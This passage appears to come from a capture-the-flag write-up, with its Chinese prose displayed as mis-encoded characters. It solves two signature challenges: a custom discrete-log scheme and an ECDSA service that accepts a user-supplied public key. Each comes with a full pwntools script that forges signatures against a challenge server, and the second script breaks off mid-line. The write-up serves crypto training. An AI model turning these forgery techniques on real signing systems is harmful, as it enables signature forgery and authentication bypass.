class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Give me the (r2,s2)</span></span><br><span class="line"><span class="keyword">if</span> r2 != r1 <span class="keyword">and</span> s2 == s1 <span class="keyword">and</span> verify(m2, r2, s2):</span><br><span class="line">    print(<span class="string">"Congratulation!Here is your flag: %s"</span> % flag)</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„ä»–ä¼šæä¾›ä¸¤ä¸ªmsgï¼Œç„¶åä½ éœ€è¦ç»™ä»–ä»¬ç­¾åï¼Œè¦æ±‚æ˜¯ï¼Œç­¾åä¸­ä¸¤è€…çš„sç›¸ç­‰ï¼Œä½†æ˜¯rä¸ç›¸ç­‰</p><p>æˆ‘ä»¬æå–ä¸€ä¸‹ä¿¡æ¯ï¼Œ</p><p>ç­¾åçš„éªŒè¯æ˜¯ s == ((y * powmod(h, r, p)) % p)</p><p>å…¶ä¸­ x å°±æ˜¯è¦è¢«ç­¾åçš„ä¿¡æ¯ï¼Œ y = powmod(g, x, p)ï¼Œ h = powmod(g, b, p) ï¼Œ  b = powmod(a, a, p - 1) ï¼Œ</p><p>a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, â€œ\0â€)).digest()) ,æ˜¾å¾—æŒºéº»çƒ¦ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æ˜¯çŸ¥é“å‚æ•°x, g, pçš„ï¼Œå› æ­¤yæ˜¯ä¸€ä¸ªå·²çŸ¥çš„å¸¸æ•°ï¼Œä»è€Œaä¹Ÿå¯ä»¥çœ‹æˆä¸€ä¸ªå·²çŸ¥å¸¸æ•°å³å¯ï¼Œç»§è€Œbã€hä¹Ÿä¼šæ˜¯ä¸€ä¸ªå·²çŸ¥å¸¸æ•°ã€‚ï¼ˆå…¨éƒ½å·²çŸ¥ï¼Œå®Œå…¨ä¸ç”¨ç®¡äº†ï¼‰</p><p>é‚£ä¹ˆs = powmod(g, x, p) * powmod(powmod(g, b, p), r, p)) == powmod(g, x + br, p)</p><p>æˆ‘ä»¬è¦ç»™ä¸åŒçš„xï¼Œæœ‰ç€ç›¸åŒçš„så’Œä¸åŒçš„rï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ æˆ‘ä»¬çš„ç›®æ ‡ç­‰å¼ï¼š powmod(g, x1 + b1r1, p) == powmod(g, x2 + b2r2, p)</p><p>å¾ˆè‡ªç„¶çš„æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæ–¹ç¨‹è½¬åŒ–ä¸º x1 + b1r1 == x2 + b2r2ï¼Œç”±äºæ¨¡æ•°pï¼Œé‚£ä¹ˆgåº”è¯¥æ˜¯ä¸€ä¸ªåŸæ ¹å­ã€‚é‚£ä¹ˆé˜¶å°±æ˜¯p - 1äº†ï¼Œæ‰€ä»¥å®Œæ•´çš„åº”è¯¥æ˜¯ x1 + b1r1 â‰¡ x2 + b2r2 ï¼ˆmod p - 1 ï¼‰    å›ºå®šr1ï¼Œé‚£ä¹ˆæœ‰r2 = (x1 + b1r1 - x2) * inverse(b2 , p-1)ï¼Œ</p><p>è¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯b2 å’Œ p - 1ä¸äº’ç´ æ€ä¹ˆåŠï¼Ÿæ’å°±å®Œäº‹äº†ï¼Œç”±äºå†³å®šb2çš„æ˜¯msg2ï¼Œæ¯æ¬¡è¿æ¥msg2éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æ’å°±å®Œäº‹ï¼Œç»è¿‡æµ‹è¯•ï¼Œäº’ç´ çš„æ¦‚ç‡è¿˜æ˜¯è›®é«˜çš„ã€‚</p><p>æˆ–è€…ä¹Ÿå¯ä»¥æå‰å°†æ–¹ç¨‹ä¸¤è¾¹æ•´é™¤b2 å’Œ p - 1çš„å…¬å› æ•°ï¼Œä½†å¦‚æœæ²¡æ³•æ•´é™¤ï¼Œé‚£å°±GGäº†ï¼Œè¿˜æ˜¯æ’å­23333 </p><p>å‚è€ƒè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">"139.129.98.9"</span>,<span class="string">"30001"</span>)</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"XXXX+"</span>)</span><br><span class="line">    suffix = sh.recvuntil(<span class="string">')'</span>).decode(<span class="string">"utf8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    log.success(suffix)</span><br><span class="line">    sh.recvuntil(<span class="string">"== "</span>)</span><br><span class="line">    cipher = sh.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">"Give me XXXX:"</span>, proof)</span><br><span class="line"></span><br><span class="line">proof_of_work(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># These three are constants</span></span><br><span class="line">p = <span class="number">12039102490128509125925019010000012423515617235219127649182470182570195018265927223</span></span><br><span class="line">g = <span class="number">10729072579307052184848302322451332192456229619044181105063011741516558110216720725</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2str</span><span class="params">(data, mode=<span class="string">"big"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"little"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"big"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[::<span class="number">-1</span>][_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parameter</span><span class="params">(m)</span>:</span></span><br><span class="line">    x = int2str(m, <span class="string">'little'</span>)</span><br><span class="line">    y = pow(g, x, p)</span><br><span class="line">    a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(<span class="number">128</span>, <span class="string">b"\0"</span>)).digest())</span><br><span class="line">    b = pow(a, a, p - <span class="number">1</span>)</span><br><span class="line">    h = pow(g, b, p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y, h, b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    r = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    s = (y * powmod(h, r, p)) % p </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str(r),str(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(m, r, s)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    <span class="keyword">if</span> s == ((y * powmod(h, r, p)) % p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Here is the frist message(64 bytes):"</span>)</span><br><span class="line">message1 = bytes.fromhex(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].decode()).decode()</span><br><span class="line">sh.recvuntil(<span class="string">"Here is the second message(64 bytes):"</span>)</span><br><span class="line">message2 = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].decode()</span><br><span class="line">print(<span class="string">"message2"</span>,message2)</span><br><span class="line">message2 = bytes.fromhex(message2).decode()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The frist message's 'r':"</span>)</span><br><span class="line">message1_r = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line">sh.recvuntil(<span class="string">"Please choice your options:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ ¹æ®é¢˜ç›®è·å–å„ä¸ªå‚æ•°</span></span><br><span class="line">message1_y, message1_h, message1_b = get_parameter(message1)</span><br><span class="line">message1_s = (message1_y * pow(message1_h, message1_r, p)) % p</span><br><span class="line">message2_s = message1_s</span><br><span class="line">message2_y, message2_h, message2_b = get_parameter(message2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"><span class="comment">#è§£é¢˜æ ¸å¿ƒ</span></span><br><span class="line"><span class="comment">#x1+b1r1=x2+b2r2</span></span><br><span class="line"></span><br><span class="line">x1 = int2str(message1, <span class="string">'little'</span>)</span><br><span class="line">b1 = message1_b</span><br><span class="line">r1 = message1_r</span><br><span class="line">x2 = int2str(message2, <span class="string">'little'</span>)</span><br><span class="line">b2 = message2_b</span><br><span class="line">tmp = gcd(b2,p<span class="number">-1</span>)</span><br><span class="line">print(tmp)</span><br><span class="line">r2 = (((x1+b1*r1-x2)//tmp)*inverse(b2//tmp,p<span class="number">-1</span>))%(p<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me the (r,s) of the second message:"</span>)</span><br><span class="line">print(<span class="string">"("</span>+str(r2)+<span class="string">","</span>+str(message2_s)+<span class="string">")"</span>)</span><br><span class="line">sh.sendline(<span class="string">"("</span>+str(r2)+<span class="string">","</span>+str(message2_s)+<span class="string">")"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h2><p>è¿™é“é¢˜è´¼ç‹ ï¼Œæºç éƒ½ä¸ç»™ï¼Œæ¥çœ‹ä¸€çœ‹MENUå­</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DEBUG</span>] Received <span class="number">0xd</span> bytes:</span><br><span class="line">    b<span class="string">'Give me XXXX:'</span></span><br><span class="line">[<span class="meta">DEBUG</span>] Sent <span class="number">0x5</span> bytes:</span><br><span class="line">    b<span class="string">'bwUI\n'</span></span><br><span class="line">[<span class="meta">DEBUG</span>] Received <span class="number">0x4f</span> bytes:</span><br><span class="line">    b<span class="string">'Hello,guys!Welcome to my ECC Signature System!I promise no one can exploit it!\n'</span></span><br><span class="line">[<span class="meta">DEBUG</span>] Received <span class="number">0x269</span> bytes:</span><br><span class="line">    b<span class="string">'Howevers if you can exploit it in 10 times,I will give what you want!\n'</span></span><br><span class="line">    b<span class="string">'Here is the frist message(64 bytes):fipoN9jy/*@~J:] PcZY8&#123;&amp;X!7v+\\duTln_#k(WK^Q2L)&lt;SbM$-V=Ex3Uw|h,%&#125;F\n'</span></span><br><span class="line">    b<span class="string">'Here is the second message(64 bytes):%wh-(xJ4kR+7&lt;^Zv9,Ol\\Kp/&amp;"FHbc_ D@Y*mSos&#125;V?.#L&#123;!3B8QiP=nqCI[y:X2\n'</span></span><br><span class="line">    b<span class="string">'Try to calculate the same signature for this two messages~\n'</span></span><br><span class="line">    b<span class="string">'(((Notice: curve = SECP256k1, hashfunc = sha1)))\n'</span></span><br><span class="line">    b<span class="string">'\n'</span></span><br><span class="line">    b<span class="string">'ECC Signature System:\n'</span></span><br><span class="line">    b<span class="string">'    1. Show your pubkey\n'</span></span><br><span class="line">    b<span class="string">'    2. Generate new prikey\n'</span></span><br><span class="line">    b<span class="string">'    3. Update your pubkey\n'</span></span><br><span class="line">    b<span class="string">'    4. Sign a message\n'</span></span><br><span class="line">    b<span class="string">'    5. Verify a message\n'</span></span><br><span class="line">    b<span class="string">'    6. Exploit\n'</span></span><br><span class="line">    b<span class="string">'    7. Exit\n'</span></span><br><span class="line">    b<span class="string">'\n'</span></span><br><span class="line">    b<span class="string">'You have only 10 times to operate!\n'</span></span><br><span class="line">    b<span class="string">'Please choice your options:'</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®åè¿™æ˜¯ä¸€ä¸ªECDSAçš„ç­¾åç³»ç»Ÿï¼Œå®Œäº†å‘¢è¦æ±‚æ˜¯ç»™è¿™ä»–æä¾›çš„ä¸¤ä¸ªmsgç­¾åï¼Œä¸ä»…éªŒè¯è¦é€šè¿‡ï¼Œè€Œä¸”ç­¾åè¿˜å¾—ä¸€æ ·ã€‚</p><p>å…ˆæ¥çœ‹çœ‹è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œ</p><p>åŠŸèƒ½1æ˜¯æ˜¾ç¤ºå…¬é’¥ï¼Œï¼ˆå¯èƒ½è¦åˆ©ç”¨ï¼‰</p><p>åŠŸèƒ½2æ˜¯é‡æ–°ç”Ÿæˆä¸€ä¸ªç§é’¥ï¼Œï¼ˆåº”è¯¥æ˜¯æ²¡ç”¨çš„ï¼Œæ²¡å•¥æ„ä¹‰ï¼Œç”Ÿæˆåå°±æ˜¯å‘Šè¯‰ä½ æ›´æ–°åçš„å…¬é’¥ï¼‰</p><p>åŠŸèƒ½3æ˜¯æ›´æ–°ä½ çš„å…¬é’¥ï¼Œä½ æ¥è¾“å…¥ï¼ˆè¿™ä¸ªè‚¯å®šæœ‰ç‚¹ç”¨ï¼‰</p><p>åŠŸèƒ½4æ˜¯å¸®ä½ ç­¾ä¸ªå ï¼ˆä¹Ÿè®¸ç”¨å¾—ä¸Šï¼‰</p><p>åŠŸèƒ½5æ˜¯éªŒè¯ç­¾å ï¼ˆå¯ä»¥ï¼Œä½†æ²¡å¿…è¦ï¼‰</p><p>åŠŸèƒ½6å°±æ˜¯æ•´å®Œäº†ç”¨æ¥è·å–flagçš„äº†ã€‚</p><p>å…­ä¸ªåŠŸèƒ½ä¸€çœ¼çœ‹æ¥ä¹Ÿå°±è¿™ä¸ªåŠŸèƒ½3å¯ä»¥ç”¨äº†ã€‚è¿™é‡Œéœ€è¦ä¸€ç‚¹å‰ç½®çŸ¥è¯†ï¼ˆç°æŸ¥å°±å¯ä»¥äº†ï¼Œä¸€æ ·çš„ï¼‰ï¼Œå°±æ˜¯ECDSAç­¾åçš„éªŒè¯è§„åˆ™</p><p>è¿™ç§<a href="https://blog.csdn.net/s_lisheng/article/details/79871341" target="_blank" rel="noopener">èµ„æ–™</a>CSDNä¸€æŠ“ä¸€å¤§æŠŠã€‚</p><p><img src="https://i.loli.net/2020/12/07/z9EpbT2FRwQrHkg.png" alt="image-20201207214850259"></p><p>æœ€åæ˜¯åˆ¤æ–­ v = rï¼Œå³ X.x = dG.x ,æˆ‘ä»¬å¯ä»¥æŠŠéªŒè¯å…¬å¼æå–å‡ºæ¥ï¼Œä¹Ÿå³ $es^{-1}G + rs^{-1}Q = dG$</p><p>æ³¨æ„åˆ°ç”±äºéªŒè¯ç”¨çš„æ˜¯å…¬é’¥Qï¼Œç„¶åé¢˜ç›®æ˜¯æä¾›ç¯¡æ”¹å…¬é’¥è¿™ä¸ªåŠŸèƒ½çš„ï¼Œæˆ‘ä»¬çŸ¥é“ECDSAä¸­$Q = kG$, å…¶ä¸­kæ˜¯ç§é’¥ï¼Œé‚£ä¹ˆå…¶å®ç­‰ä»·äºæˆ‘ä»¬æ˜¯å¯ä»¥ç¯¡æ”¹ç§é’¥çš„ï¼Œå³æˆ‘ä»¬ç”¨è‡ªå·±çš„ç§é’¥å»ç»™ä¸€ä¸ªä¿¡æ¯ç­¾åï¼Œå®Œäº†åæŠŠç”¨äºéªŒè¯çš„å…¬é’¥ç»™æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å…¬é’¥ï¼ŒéªŒè¯åŒæ ·ä¹Ÿæ˜¯å¯ä»¥é€šè¿‡çš„ã€‚é‚£ä¹ˆæ•´ä¸ªè¿‡ç¨‹ç³»ç»Ÿçš„ç§é’¥éƒ½ä¸å‚ä¸äº†ã€‚</p><p>è§£å†³äº†ç­¾åéªŒè¯çš„é—®é¢˜ï¼Œå‰©ä¸‹æ¥å°±æ˜¯è§£å†³å¦‚ä½•è®©ä»–ä»¬çš„ç­¾åä¿æŒä¸€è‡´äº†ã€‚</p><p>å›åˆ°éªŒè¯å…¬å¼ $es^{-1}G + rs^{-1}Q = dG$</p><p>å…¶ä¸­eæ˜¯æˆ‘ä»¬çš„æ¶ˆæ¯ï¼Œå¯ä»¥çœ‹ä½œå·²çŸ¥å¸¸æ•°ï¼Œrå’Œsæ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼ŒGæ˜¯å›ºå®šçš„ï¼ŒQæ˜¯å…¬é’¥ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è‡ªå·±å†³å®šï¼Œdæ˜¯ç­¾åæ—¶ç”¨çš„éšæœºæ•°ï¼Œæ•´ä¸ªç­¾åçš„è¿‡ç¨‹æˆ‘ä»¬éƒ½èƒ½æŒæ¡ï¼Œè‡ªç„¶dä¹Ÿæœ‰æˆ‘ä»¬å†³å®šï¼Œç„¶ådä¼šå†³å®šrï¼Œå› ä¸ºr = dG.xï¼Œ é‚£ä¹ˆrä¹Ÿå°±å›ºå®šä¸‹æ¥äº†ï¼Œåªå‰©Qå’Œsäº†ã€‚</p><p>æˆ‘ä»¬æŠŠå…¬å¼çº¦ä¸€çº¦ï¼Œå»æ‰Gåå°±æ˜¯ $es^{-1} + rs^{-1}k = d  =&gt; e + rk = ds =&gt; s = (e + rk)*d^{-1}$</p><p>ç”±äºä¸¤ä¸ªmsgçš„sè¦ä¿æŒä¸€ç›´ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ çš„ç­‰å¼å°±æ˜¯$ (e_1 + rk) * d^{-1} = (e_2 + rk) * d^{-1}$</p><p>å¾ˆæ˜¾ç„¶å•Šï¼Œå› ä¸ºdä¸èƒ½ç­‰äº0ï¼Œè¿™ç­‰å¼ä¸å¯èƒ½æˆç«‹å•Šï¼Œäºæ˜¯é™·å…¥åƒµå±€ã€‚</p><p>ä½†è¿™é‡Œæˆ‘ä»¬å¿˜äº†ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨ï¼Œå°±æ˜¯ï¼Œæˆ‘ä»¬æœ€åéªŒè¯çš„æ˜¯v = rï¼Œè€Œræ˜¯ä»€ä¹ˆï¼Œr = dG.xï¼Œæˆ‘ä»¬è¦çŸ¥é“çš„æ˜¯ï¼Œæ¤­åœ†æ›²çº¿æ˜¯ä¸€ä¸ªå…³äºxè½´å¯¹ç§°çš„å›¾å½¢ï¼Œæ‰€ä»¥å…¶å® r = -dG.xã€‚åç‚¹éƒ½å‘ç°äº†ï¼Œè¿™é¢˜å°±è§£å†³äº†ï¼Œ</p><p>ç­‰å¼å˜ä¸º$ (e_1 + rk) * d^{-1} = (e_2 + rk) * (-d)^{-1}$</p><p>åŒ–æˆåŒä½™å¼å°±æ˜¯$ (e_1 + rk) * d^{-1} \equiv (e_2 + rk) * (-d)^{-1} \pmod{n}$</p><p>æœ‰ $e_1 + rk \equiv -e_2 -rk\pmod{n}$</p><p>æœ‰ $k \equiv \frac{-e1-e2}{2r}\pmod{n}$</p><p>ç„¶åæ€•ã€æˆ‘ä»¬å»æŸ¥ä¸€ä¸‹è¿™æ¡æ›²çº¿çš„<a href="https://www.secg.org/sec2-v2.pdf" target="_blank" rel="noopener">å‚æ•°</a>å³å¯</p><p>å‚è€ƒè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">"139.129.98.9"</span>,<span class="string">"30002"</span>)</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">7</span></span><br><span class="line">q=<span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line">gx=<span class="number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span></span><br><span class="line">gy=<span class="number">0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</span></span><br><span class="line">order=<span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line"></span><br><span class="line">ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">G = ecc(gx,gy)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(content).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"XXXX+"</span>)</span><br><span class="line">    suffix = sh.recvuntil(<span class="string">')'</span>).decode(<span class="string">"utf8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    log.success(suffix)</span><br><span class="line">    sh.recvuntil(<span class="string">"== "</span>)</span><br><span class="line">    cipher = sh.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">"Give me XXXX:"</span>, proof)</span><br><span class="line"></span><br><span class="line">proof_of_work(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Here is the frist message(64 bytes):"</span>)</span><br><span class="line">msg1 = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Here is the second message(64 bytes):"</span>)</span><br><span class="line">msg2 = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">message = hex(bytes_to_long(msg1))[<span class="number">2</span>:]</span><br><span class="line">e1=bytes_to_long(sha1(msg1))</span><br><span class="line">e2=bytes_to_long(sha1(msg2))</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"><span class="comment">#è§£é¢˜æ ¸å¿ƒ</span></span><br><span class="line"><span class="comment">#pubkey = sh.recvuntil("\n")[:-2].decode()</span></span><br><span class="line"><span class="comment">#r=[d * G].x</span></span><br><span class="line">d=<span class="number">12321</span></span><br><span class="line">r=int((d*G)[<span class="number">0</span>])</span><br><span class="line">new_k = ((-e1-e2)*inverse(<span class="number">2</span>*r,order))%order</span><br><span class="line">new_Q = new_k * G</span><br><span class="line">new_S = ((e1 + new_k*r)*inverse(d,order))%order</span><br><span class="line">newpubkey = hex(new_Q[<span class="number">0</span>]).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)+hex(new_Q[<span class="number">1</span>]).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)</span><br><span class="line">newsignature = hex(r).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)+hex(new_S).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Please choice your options:"</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me your public_key(hex):"</span>)</span><br><span class="line">sh.sendline(newpubkey)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Please choice your options:"</span>)</span><br><span class="line">sh.sendline(<span class="string">"6"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me the signature(hex) of the frist message:\n"</span>)</span><br><span class="line">sh.sendline(newsignature)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me the signature(hex) of the second message:\n"</span>)</span><br><span 